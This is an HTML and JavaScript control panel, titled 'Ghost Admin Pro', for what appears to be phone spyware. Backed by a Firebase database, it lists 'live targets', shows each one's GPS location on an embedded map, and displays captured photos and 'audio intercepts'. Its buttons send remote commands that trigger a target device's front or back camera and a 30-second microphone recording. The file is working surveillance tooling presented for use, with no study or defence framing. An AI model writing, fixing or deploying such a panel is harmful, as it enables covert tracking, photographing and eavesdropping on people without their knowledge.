<!DOCTYPE html>
<html>
<head>
    <title>Ghost Admin Pro - AUTO SYNC</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; height: 100vh; margin: 0; }
        #sidebar { width: 300px; border-right: 2px solid #0f0; padding: 20px; background: #050505; overflow-y: auto; }
        #main { flex: 1; display: flex; flex-direction: column; background: #000; }
        .target-item { padding: 10px; border: 1px solid #333; margin-bottom: 5px; cursor: pointer; font-size: 14px; }
        .target-item:hover { border-color: #0f0; background: #010; }
        .active-target { background: #020; border-color: #0f0; box-shadow: 0 0 10px #0f0; }
        #feed { flex: 1; padding: 20px; overflow-y: auto; border-top: 1px solid #0f0; }
        .btn { width: 100%; padding: 10px; margin: 5px 0; background: #050; color: #0f0; border: 1px solid #0f0; cursor: pointer; font-weight: bold; }
        img { width: 200px; border: 1px solid #0f0; margin: 5px; }
        audio { filter: invert(1); width: 100%; margin-top: 10px; }
    </style>
</head>
<body>

<div id="sidebar">
    <h3 style="text-align: center;">LIVE TARGETS</h3>
    <div id="targetList">Scanning for signals...</div>
    <hr style="border-color: #0f0;">
    <div id="controls" style="display:none;">
        <p>Selected: <span id="curTid" style="color:#fff;">None</span></p>
        <button class="btn" onclick="sendCmd('photo_front')">FRONT PHOTO</button>
        <button class="btn" onclick="sendCmd('photo_back')">BACK PHOTO</button>
        <button class="btn" onclick="sendCmd('audio_record')">RECORD 30S AUDIO</button>
        <button class="btn" style="background:#400; color:#f00;" onclick="deleteTarget()">DELETE</button>
    </div>
</div>

<div id="main">
    <div style="height: 250px; border-bottom: 1px solid #0f0;">
        <iframe id="map" width="100%" height="100%" frameborder="0" style="filter: grayscale(1) invert(1);"></iframe>
    </div>
    <div id="feed">
        <div id="locInfo" style="color: #0f0; font-weight: bold; margin-bottom: 10px;">Waiting for GPS...</div>
        <hr>
        <h4>GALLERY</h4>
        <div id="gallery"></div>
        <hr>
        <h4>AUDIO INTERCEPTS</h4>
        <div id="audios"></div>
    </div>
</div>

<script>
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();

    let currentTid = null;

    db.ref('targets').on('value', snap => {
        const listDiv = document.getElementById('targetList');
        listDiv.innerHTML = "";
        const data = snap.val();
        if(!data) { listDiv.innerHTML = "No targets online."; return; }

        for(let id in data) {
            const div = document.createElement('div');
            div.className = 'target-item' + (id === currentTid ? ' active-target' : '');
            div.innerText = "ðŸ“¡ ID: " + id;
            div.onclick = () => selectTarget(id);
            listDiv.appendChild(div);
        }
    });

    function selectTarget(id) {
        currentTid = id;
        document.getElementById('curTid').innerText = id;
        document.getElementById('controls').style.display = "block";
        document.getElementById('gallery').innerHTML = "";
        document.getElementById('audios').innerHTML = "";
        
        // --- FIXED LOCATION LISTENER ---
        db.ref('targets/' + id + '/location').on('value', (snap) => {
            const loc = snap.val();
            if (loc) {
                // locDisplay ki jagah locInfo use karein (jo HTML mein hai)
                document.getElementById('locInfo').innerHTML = 
                    `LAT: ${loc.lat} | LNG: ${loc.lng} <br> TIME: ${loc.last_seen || 'N/A'}`;
                
                // 1{loc.lat} ko theek karke standard Google Maps link banaya
                const mapUrl = "https://maps.google.com/maps?q=" + loc.lat + "," + loc.lng + "&z=15&output=embed";
                document.getElementById('map').src = mapUrl;
            }
        });

        db.ref('targets/' + id + '/photos').on('child_added', s => {
            const img = document.createElement('img');
            img.src = s.val().img || s.val().image;
            document.getElementById('gallery').prepend(img);
        });

        db.ref('targets/' + id + '/audios').on('child_added', s => {
            const aud = document.createElement('audio');
            aud.controls = true;
            aud.src = s.val().audio || s.val().data;
            document.getElementById('audios').prepend(aud);
        });
    }

    function sendCmd(act) {
        if(!currentTid) return;
        db.ref('commands/' + currentTid).set({ action: act, time: Date.now() });
        alert("Command Sent: " + act);
    }

    function deleteTarget() {
        if(currentTid && confirm("Delete data?")) {
            db.ref('targets/' + currentTid).remove();
            db.ref('commands/' + currentTid).remove();
            location.reload();
        }
    }
</script>
</body>
</html>
